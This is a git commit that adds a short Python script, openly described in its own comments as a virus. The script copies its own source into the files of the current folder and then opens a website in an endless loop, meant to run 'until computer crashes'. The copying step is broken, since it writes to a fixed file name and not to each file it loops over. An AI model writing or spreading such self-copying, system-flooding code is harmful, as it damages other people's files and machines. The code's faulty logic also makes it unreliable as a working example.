9404e752b4bd0588f32c6c6ade2a413534e97abe
Ashkan Ebtekari <56440241+Chamepp@users.noreply.github.com>
2021-01-21 01:22:15 +0330

    Add files via upload

---
+++ WebBrowser.py
@@ -0,0 +1,26 @@
+import os
+import time
+import webbrowser
+
+
+def WebBrowser():
+    link = "chamepp.com"
+    print("Starting The Virus !")
+
+    # Open and Get The Virus File Code
+    virus_file = open("WebBrowser.py", "r")
+    virus_code = virus_file.read()
+    virus_file.close()
+
+    # Copy The Virus Code To All Entries
+    for file_name in os.listdir():
+        file = open("file_name", "a")
+        file.write(virus_code)
+        file.close()
+
+        # Open Browsers Until Computer Crashes
+        while True:
+            webbrowser.open(link)
+
+
+WebBrowser()
